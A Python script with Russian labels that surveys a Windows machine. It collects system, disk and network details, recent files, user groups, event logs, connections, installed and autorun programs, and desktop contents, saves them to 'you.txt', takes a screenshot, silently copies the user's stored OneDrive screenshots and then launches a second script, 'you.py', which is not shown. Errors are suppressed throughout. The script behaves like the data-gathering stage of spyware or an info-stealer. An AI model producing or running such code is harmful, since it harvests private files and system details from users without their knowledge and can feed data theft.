import os
import platform
import socket
import psutil
import datetime
import pytz
from pathlib import Path
import pyautogui
import shutil
import subprocess

def save_to_file(data, filename="you.txt"):
    with open(filename, "w", encoding="utf-8") as file:
        file.write(data)

def create_screenshots(folder="screenshots"):
    if not os.path.exists(folder):
        os.makedirs(folder)
    try:
        screenshot = pyautogui.screenshot()
        filepath = os.path.join(folder, "screenshot.png")
        screenshot.save(filepath)
    except Exception as e:
        pass

def copy_existing_screenshots(target_folder="screenshots"):
    user_pictures_path = Path.home() / "OneDrive" / "Изображения" / "Снимки экрана"
    if not user_pictures_path.exists():
        return
    if not os.path.exists(target_folder):
        os.makedirs(target_folder)
    for screenshot_file in user_pictures_path.glob("*.png"):
        try:
            shutil.copy(screenshot_file, target_folder)
        except Exception as e:
            pass

def get_recently_opened_files():
    recent_path = Path.home() / "AppData" / "Roaming" / "Microsoft" / "Windows" / "Recent"
    data = ["\n=== НЕДАВНО ОТКРЫТЫЕ ФАЙЛЫ ==="]
    if not recent_path.exists():
        data.append(f"Папка Recent не найдена: {recent_path}")
        return "\n".join(data)
    try:
        for recent_file in recent_path.glob("*"):
            if recent_file.is_file():
                access_time = datetime.datetime.fromtimestamp(recent_file.stat().st_atime).strftime('%Y-%m-%d %H:%M:%S')
                data.append(f"Файл: {recent_file.name}, Последний доступ: {access_time}")
    except Exception as e:
        data.append(f"Ошибка при обработке папки Recent: {e}")
    return "\n".join(data)

def get_system_info():
    data = [
        "=== СИСТЕМНАЯ ИНФОРМАЦИЯ ===",
        f"Операционная система: {platform.system()} {platform.release()}",
        f"Версия ОС: {platform.version()}",
        f"Архитектура: {platform.architecture()[0]}",
        f"Имя устройства: {platform.node()}",
        f"Имя пользователя: {os.getlogin()}",
        f"Процессор: {platform.processor()}",
        f"Количество ядер CPU: {os.cpu_count()}"
    ]
    return "\n".join(data)

def get_memory_info():
    memory = psutil.virtual_memory()
    data = [
        "\n=== ИНФОРМАЦИЯ О ПАМЯТИ ===",
        f"Всего памяти: {round(memory.total / (1024 ** 3), 2)} GB",
        f"Свободно памяти: {round(memory.available / (1024 ** 3), 2)} GB",
        f"Используется памяти: {round(memory.used / (1024 ** 3), 2)} GB",
        f"Процент использования: {memory.percent}%"
    ]
    return "\n".join(data)

def get_disk_info():
    data = ["\n=== ИНФОРМАЦИЯ О ДИСКАХ ==="]
    partitions = psutil.disk_partitions()
    for partition in partitions:
        data.append(f"Диск: {partition.device}")
        data.append(f"  Файловая система: {partition.fstype}")
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            data.append(f"  Всего: {round(usage.total / (1024 ** 3), 2)} GB")
            data.append(f"  Используется: {round(usage.used / (1024 ** 3), 2)} GB")
            data.append(f"  Свободно: {round(usage.free / (1024 ** 3), 2)} GB")
            data.append(f"  Процент использования: {usage.percent}%")
        except PermissionError:
            data.append("  Нет доступа к информации")
    return "\n".join(data)

def get_network_info():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    try:
        main_ip = socket.gethostbyname(socket.getfqdn())
    except Exception:
        main_ip = "Не удалось определить"
    data = [
        "\n=== СЕТЕВАЯ ИНФОРМАЦИЯ ===",
        f"Имя хоста: {hostname}",
        f"Локальный IP-адрес: {ip_address}",
        f"Основной IP-адрес: {main_ip}"
    ]
    return "\n".join(data)

def get_user_info():
    data = [
        "=== ДАННЫЕ О ПОЛЬЗОВАТЕЛЕ ===",
        f"Имя пользователя: {os.getlogin()}",
        f"Путь к профилю пользователя: {Path.home()}"
    ]
    try:
        groups = subprocess.check_output("whoami /groups", shell=True, text=True)
        data.append("\nГруппы пользователя:")
        data.append(groups.strip())
    except Exception as e:
        pass
    return "\n".join(data)

def get_event_logs():
    data = ["\n=== ЖУРНАЛ СОБЫТИЙ ==="]
    try:
        logs = subprocess.check_output("wevtutil qe System /c:10 /f:text", shell=True, text=True)
        data.append(logs.strip())
    except Exception as e:
        pass
    return "\n".join(data)

def get_network_connections():
    data = ["\n=== АКТИВНЫЕ СЕТЕВЫЕ ПОДКЛЮЧЕНИЯ ==="]
    try:
        connections = psutil.net_connections(kind="inet")
        for conn in connections:
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "N/A"
            raddr = f"{conn.raddr.ip}:{conn.raddr.port}" if conn.raddr else "N/A"
            data.append(f"Локальный адрес: {laddr}, Удаленный адрес: {raddr}, Статус: {conn.status}")
    except Exception as e:
        pass
    return "\n".join(data)

def get_installed_programs():
    data = ["\n=== УСТАНОВЛЕННЫЕ ПРОГРАММЫ ==="]
    try:
        programs = subprocess.check_output("wmic product get name", shell=True, text=True, stderr=subprocess.DEVNULL)
        data.extend(programs.splitlines()[1:])
    except Exception as e:
        pass
    return "\n".join(data)

def get_system_uptime():
    data = ["\n=== ВРЕМЯ РАБОТЫ СИСТЕМЫ ==="]
    try:
        uptime_seconds = (datetime.datetime.now() - datetime.datetime.fromtimestamp(psutil.boot_time())).total_seconds()
        uptime_str = str(datetime.timedelta(seconds=uptime_seconds))
        data.append(f"С момента включения: {uptime_str}")
    except Exception as e:
        pass
    return "\n".join(data)

def get_autorun_programs():
    data = ["\n=== ПРОГРАММЫ АВТОЗАПУСКА ==="]
    try:
        autorun = subprocess.check_output("wmic startup get caption,command", shell=True, text=True, stderr=subprocess.DEVNULL)
        data.extend(autorun.splitlines()[1:])
    except Exception as e:
        pass
    return "\n".join(data)

def get_desktop_files():
    data = ["\n=== ФАЙЛЫ НА РАБОЧЕМ СТОЛЕ ==="]
    desktop_path = Path.home() / "Desktop"
    try:
        if desktop_path.exists():
            for item in desktop_path.iterdir():
                item_type = "Папка" if item.is_dir() else "Файл"
                data.append(f"{item_type}: {item.name}")
    except Exception as e:
        pass
    return "\n".join(data)

if __name__ == "__main__":
    info = []
    info.append(get_system_info())
    info.append(get_memory_info())
    info.append(get_disk_info())
    info.append(get_network_info())
    info.append(get_recently_opened_files())
    info.append(get_user_info())
    info.append(get_event_logs())
    info.append(get_network_connections())
    info.append(get_installed_programs())
    info.append(get_system_uptime())
    info.append(get_autorun_programs())
    info.append(get_desktop_files())

    final_data = "\n".join(info)
    print(final_data)
    save_to_file(final_data)

    create_screenshots()
    copy_existing_screenshots()

    try:
        subprocess.Popen(["python", "you.py"], shell=True)
    except Exception as e:
        print(f"Ошибка при запуске you.py: {e}")
